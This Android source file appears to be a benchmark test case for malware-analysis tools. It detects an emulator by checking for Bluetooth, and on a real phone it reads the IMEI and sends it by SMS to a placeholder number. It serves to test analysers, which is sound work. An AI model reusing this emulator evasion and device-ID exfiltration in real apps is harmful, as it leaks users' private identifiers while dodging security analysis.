package com.example.newedtester;

import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.widget.Button;

/**
 * @testcase_name EmulatorDetection_Bluetooth1
 * @version 0.1
 * @author Malviya National Institute of Technology, Jaipur INDIA 
 * @author_mail jyotigajrani@gmail.com
 * 
 * @description This test detects the Android emulator by checking the bluetooth.
 * The non-presence of Bluetooth sensor identify the environment as Emulator. This
 * app send IMEI number  via SMS if the app runs on a real phone.
 * @dataflow onCreate: imei -> SMS 
 * @number_of_leaks 1
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		final TextView[] txtStatus = new TextView[1];

		final String[] status = {"Can't Detect"};
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {

				txtStatus[0] = (TextView) findViewById(R.id.txtStatus);
				BluetoothAdapter ba = BluetoothAdapter.getDefaultAdapter();
				if (ba == null)
				{
					status[0] = "\tBluetooth: Emulator";
				}
				else
				{
					TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
					String imei = telephonyManager.getDeviceId();

					SmsManager sm = SmsManager.getDefault();
					String number = "+49 1234";
					sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
					status[0] = "\tBluetooth: Device";
				}
				txtStatus[0].setText(status[0]);
			}
		});

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}